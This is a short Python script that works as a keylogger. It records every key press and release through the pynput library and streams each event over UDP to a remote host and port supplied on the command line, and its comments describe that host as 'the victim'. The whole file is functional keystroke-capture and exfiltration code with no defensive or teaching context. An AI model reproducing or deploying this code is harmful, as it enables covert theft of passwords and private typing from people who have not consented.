#!/usr/bin/env python3

import sys
from socket import socket, AF_INET, SOCK_DGRAM, gethostbyname_ex, gethostname
from pynput.keyboard import Key, Listener

# Attack the victim at a given IP address
SERVER_IP   = sys.argv[1]
PORT_NUMBER = 5000

SERVER = (SERVER_IP, PORT_NUMBER)
SIZE = 1024
print("Attacking victim at {0}:{1}\n".format(SERVER_IP, PORT_NUMBER))

msg_socket = socket( AF_INET, SOCK_DGRAM )

def on_press(key):
    msg = None
    try:
        msg = '{0} pressed'.format(key.char)
    except:
        msg = '{0} pressed'.format(key)
    print(msg)
    msg_socket.sendto(msg.encode('utf-8'), SERVER)

def on_release(key):
    msg = None
    try:
        msg = '{0} released'.format(key.char)
    except:
        msg = '{0} released'.format(key)
    print(msg)
    msg_socket.sendto(msg.encode('utf-8'), SERVER)

# Collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

